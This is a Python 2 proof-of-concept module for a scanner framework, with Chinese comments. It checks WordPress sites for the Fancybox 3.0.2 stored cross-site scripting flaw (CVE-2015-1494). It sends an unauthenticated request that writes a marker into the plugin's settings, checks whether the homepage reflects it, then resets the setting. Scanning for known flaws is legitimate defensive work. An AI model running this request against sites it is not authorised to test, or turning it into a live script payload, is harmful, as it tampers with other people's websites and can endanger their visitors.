# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0097' # 平台漏洞编号，留空
    name = 'WordPress Plugin Fancybox 3.0.2 - Persistent Cross-Site Scripting' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2015-02-16'  # 漏洞公布时间
    desc = '''
        WordPress Plugin Fancybox 3.0.2 - Persistent Cross-Site Scripting
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36087/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'CVE-2015-1494	Type: Webapps' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin Fancybox 3.0.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8efbbebe-f9e3-48c9-94f2-e37838086aeb'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            verify_url = url + '/wp-admin/admin-post.php?page=fancybox-for-wordpress'
            payload = 'action=update&mfbfw%5Bpadding%5D=VulnerableTag'
            hh.http('-d ' + payload + ' -L ' + verify_url)
            code, head, res, errcode, _ = hh.http('-L ' + url)
            clearload = 'action=update&mfbfw%5Bpadding%5D=10'
            hh.http('-d ' + clearload + ' -L ' + verify_url)
            if 'VulnerableTag' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()